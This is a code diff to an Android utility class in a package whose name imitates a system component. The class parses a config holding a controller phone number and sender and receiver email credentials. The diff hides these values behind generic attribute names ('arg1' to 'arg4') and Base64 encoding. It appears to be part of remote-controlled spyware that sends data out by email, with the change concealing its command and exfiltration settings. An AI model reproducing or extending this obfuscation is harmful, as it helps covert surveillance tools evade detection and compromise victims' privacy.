@@ -2,7 +2,9 @@ package com.android.system.controled.util;
 
 import android.content.Context;
 import android.content.res.XmlResourceParser;
+import android.util.Base64;
 
+import com.android.system.controled.Debug;
 import com.android.system.controled.R;
 import com.android.system.controled.bean.ConfigInfo;
 
@@ -34,10 +36,10 @@ public class XmlUtil {
 			int xmlEventType;
 			while ((xmlEventType = xml.next()) != XmlResourceParser.END_DOCUMENT) {
 				if (xmlEventType == XmlResourceParser.START_TAG && "provider".equals(xml.getName())) {
-					result.setControllerTel(getXmlAttribute(context, xml, "controllertel"));
-					result.setSenderEmailAddr(getXmlAttribute(context, xml, "senderemail"));
-					result.setSenderPwd(getXmlAttribute(context, xml, "senderpassward"));
-					result.setReceiveEmailAddr(getXmlAttribute(context, xml, "receiveemail"));
+					result.setControllerTel(new String(Base64.decode(getXmlAttribute(context, xml, "arg1"), Base64.DEFAULT)));
+					result.setReceiveEmailAddr(new String(Base64.decode(getXmlAttribute(context, xml, "arg2"), Base64.DEFAULT)));
+					result.setSenderEmailAddr(new String(Base64.decode(getXmlAttribute(context, xml, "arg3"), Base64.DEFAULT)));
+					result.setSenderPwd(new String(Base64.decode(getXmlAttribute(context, xml, "arg4"), Base64.DEFAULT)));
 				}
 			}
 		} catch (Exception e) {
